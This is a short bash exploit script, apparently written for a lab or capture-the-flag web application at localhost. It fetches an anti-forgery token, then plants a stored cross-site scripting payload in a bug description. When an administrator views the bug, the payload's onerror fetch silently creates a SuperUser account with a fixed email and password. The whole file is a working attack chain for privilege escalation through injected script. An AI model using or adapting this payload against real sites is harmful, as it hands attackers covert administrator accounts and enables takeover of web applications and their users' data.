#!/bin/bash

if [[ $# -eq 0 ]]
then
    echo "USAGE: $0 <cookieJar>"
    exit 1
fi

rhost="http://localhost"
cookieJar=$1

xsrf_token=$(curl -s -b $cookieJar "$rhost/Bugs/Details?name=Off%20by%20One%20Bug" | htmlq 'input[name=xsrf_token]' -a value)

req='Data.Email=gg@bugznet.com&Data.Password=12345678&Data.ConfirmationPassword=12345678&Data.Role=SuperUser&xsrf_token='
payload='X"><img/src/onerror=fetch("/Admin/Users/CreateEdit?handler=create",{method:"POST",body:"'$req'"+document.getElementsByName("xsrf_token")[0].value,headers:{"Content-Type":"application/x-www-form-urlencoded"}})>'

curl -s -i -b $cookieJar \
    --data-urlencode 'Bug.Name=Off by One Bug' \
    --data-urlencode "Bug.Description=$payload" \
    --data-urlencode "xsrf_token=$xsrf_token" \
    "$rhost/Bugs/Details?name=Off%20by%20One%20Bug"
    
echo "Now we wait for admin to trigger the Injection"
echo "Once triggered the user gg@bugznet.com with pass 12345678 will be created"
